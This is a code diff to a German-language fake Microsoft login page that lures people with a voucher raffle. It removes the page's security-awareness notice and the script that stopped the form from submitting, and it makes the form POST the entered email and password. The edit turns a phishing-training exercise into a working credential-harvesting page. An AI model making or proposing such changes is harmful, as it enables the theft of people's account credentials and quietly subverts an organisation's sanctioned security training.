@@ -108,7 +108,7 @@
         <h1>Anmeldung</h1>
         <p>Melden Sie sich mit Ihrem Microsoft-Konto an, um an der Gutscheinverlosung teilzunehmen.</p>
 
-        <form id="loginForm">
+        <form method="POST">
             <label for="email">E-Mail-Adresse</label>
             <input type="email" id="email" name="email" placeholder="name@firma.ch" required>
 
@@ -116,7 +116,7 @@
             <input type="password" id="password" name="password" placeholder="Kennwort" required>
 
             <div class="checkbox-row">
-                <input type="checkbox" id="staySignedIn">
+                <input type="checkbox" id="staySignedIn" name="staySignedIn">
                 <label for="staySignedIn" style="display:inline; font-size:12px;">Angemeldet bleiben</label>
             </div>
 
@@ -127,33 +127,6 @@
             </div>
         </form>
     </div>
-
-    <div class="awareness-box hidden" id="awarenessBox">
-        <h2>Hinweis zur Security‑Awareness‑Übung</h2>
-        <p>Diese Anmeldung war Teil einer Security‑Awareness‑Übung.</p>
-        <p>
-            In einem echten Angriff hätten Angreifer hier Ihre Zugangsdaten stehlen können,
-            zum Beispiel für E‑Mail oder Cloud‑Dienste. Häufig werden „echte“ Inhalte wie
-            Umfragen, Gewinnspiele oder Gutscheine genutzt, um Vertrauen zu gewinnen.
-        </p>
-        <p>In dieser Übung wurden keine eingegebenen Daten gespeichert.</p>
-
-        <p><strong>So schützen Sie sich künftig:</strong></p>
-        <ul class="awareness-list">
-            <li>Seien Sie misstrauisch bei Links in unerwarteten E‑Mails.</li>
-            <li>Prüfen Sie die Internetadresse (URL) genau.</li>
-            <li>Geben Sie keine Zugangsdaten ein, wenn Sie unsicher sind.</li>
-            <li>Melden Sie verdächtige E‑Mails an IT / Security.</li>
-        </ul>
-    </div>
 </div>
-
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-        e.preventDefault();
-        document.getElementById('loginBox').classList.add('hidden');
-        document.getElementById('awarenessBox').classList.remove('hidden');
-    });
-</script>
 </body>
 </html>
